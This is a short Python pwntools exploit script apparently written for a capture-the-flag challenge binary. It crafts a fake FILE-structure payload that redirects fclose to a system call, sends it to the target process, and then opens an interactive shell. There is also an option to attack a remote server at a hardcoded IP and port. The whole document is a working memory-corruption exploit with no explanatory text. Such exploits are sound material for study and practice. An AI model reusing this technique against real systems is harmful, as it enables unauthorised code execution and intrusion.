#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
binary = './task_challenge1'
elf = ELF(binary)
context.log_level = 'debug'
context.arch = elf.arch
local = 1
if local:
    p = process(binary)
else:
    p = remote('202.112.51.184', 30003)
ub_offset = 0x3c4b30
p.sendlineafter('>', '1')
gdb.attach(p, 'b *_IO_new_fclose')
buf_addr = 0x6010C0
system = 0x400897
payload = (
    ((('\x00' * 0x10 + p64(system) + '\x00' * 70).ljust(0x88,'\x00') + p64(buf_addr)).ljust(0xd8, '\x00') + p64(buf_addr)).ljust(0x100, '\x00') + 
    p64(buf_addr)
)
p.sendline(payload)
p.sendlineafter('>', '3')
p.interactive()
